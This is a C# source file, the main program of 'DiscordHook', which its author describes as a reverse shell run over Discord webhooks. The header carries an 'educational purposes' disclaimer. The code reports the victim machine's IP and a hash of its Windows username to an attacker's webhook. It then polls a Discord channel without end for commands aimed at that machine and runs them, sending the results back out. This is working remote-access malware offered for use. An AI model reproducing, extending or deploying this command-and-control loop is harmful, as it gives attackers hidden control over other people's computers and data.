using System.Threading.Tasks;
using static DiscordHook.Alerts;
using static DiscordHook.DiscordApi;
using static DiscordHook.CommandHandler;
using static DiscordHook.Utility;

/************************************************************************
 *  Simple reverse shell and more using discord webhooks made by        *
 *                          DawnOfSorrow#1977                           *
 *  I am not responsible for any missuses of this code                  *
 *  this is purely for educational purposes dont use it on anyones pc   *
 *  without permission.                                                 *    
 *  I'm still a cs student in my 2nd year so the code quality might not *
 *  be that good but it will do the job :)                              *
 ************************************************************************/

namespace DiscordHook
{
    internal static class Program
    {
        private static async Task Main(string[] args)   //the executable and the dlls must be put in a directory named DiscordHook
        {                                               //You can build a simple one executable to download all the necessary files
            var hashprefix = ComputeSha256Hash(System.Security.Principal.WindowsIdentity.GetCurrent().Name);
            var alerthook = await GetAlertWebHook();
            await Task.Delay(500);
            var replyhook = await GetReplyWebHook();
            await Task.Delay(500);
            var botToken = await GetBotToken();
            await Task.Delay(500);
            var channelurl = await GetChannelUrl();
            await Task.Delay(500);
            var commandhook = await GetCommandWebHook();
            await Task.Delay(500);

            await SendHookAlertAsync(await GetIpAsync(), alerthook, hashprefix);
            var save = true;

            while (true)
            {
                await Task.Delay(1000);
                var command = await GetCommand(botToken, channelurl);
                switch (command)
                {
                    case "ping" when save:
                        await SendHookAlertAsync(await GetIpAsync(), alerthook, hashprefix);
                        save = false;
                        break;
                    case "null":
                        save = true;
                        continue;
                }
                if (command.Contains(hashprefix) ) await HandleCmd(command.Substring(65), replyhook, commandhook);
            }

            
            // ReSharper disable once FunctionNeverReturns
        }
    }
}